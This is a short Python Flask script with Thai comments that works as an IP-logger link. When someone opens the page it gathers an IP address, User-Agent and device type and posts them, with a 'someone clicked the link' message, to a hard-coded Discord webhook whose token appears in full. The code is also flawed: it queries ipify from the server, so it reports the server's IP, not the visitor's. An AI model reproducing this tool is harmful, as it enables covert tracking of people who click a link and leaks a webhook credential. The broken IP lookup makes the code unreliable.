from flask import Flask, request
import requests

app = Flask(__name__)

# Webhook URL ของคุณ
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk"
IPIFY_API_URL = "https://api.ipify.org?format=json"  # API สำหรับดึง IP ของผู้ใช้

@app.route("/", methods=["GET"])
def send_ip():
    # เรียกใช้ ipify API เพื่อดึง IP ของผู้ใช้
    try:
        ip_response = requests.get(IPIFY_API_URL)
        ip_data = ip_response.json()
        user_ip = ip_data.get("ip")  # ดึง IP จากผลลัพธ์ API

        user_agent = request.headers.get("User-Agent")  # ดึงข้อมูล User-Agent

        # เช็คว่า User-Agent มาจาก PC หรือมือถือ
        if "Mobile" in user_agent:
            device_type = "Mobile"
        else:
            device_type = "PC"

        # ข้อมูลที่จะส่งไปยัง Discord
        payload = {
            "content": f"มีคนกดลิงก์! IP: {user_ip}, อุปกรณ์: {device_type}, User-Agent: {user_agent}"
        }

        # ส่งข้อมูลไปยัง Discord Webhook
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            return "ส่งสำเร็จ!", 200  # ส่งข้อมูลสำเร็จ
        else:
            return f"ไม่สามารถส่งข้อมูลได้: {response.status_code}, {response.text}", 500

    except Exception as e:
        return f"เกิดข้อผิดพลาด: {str(e)}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
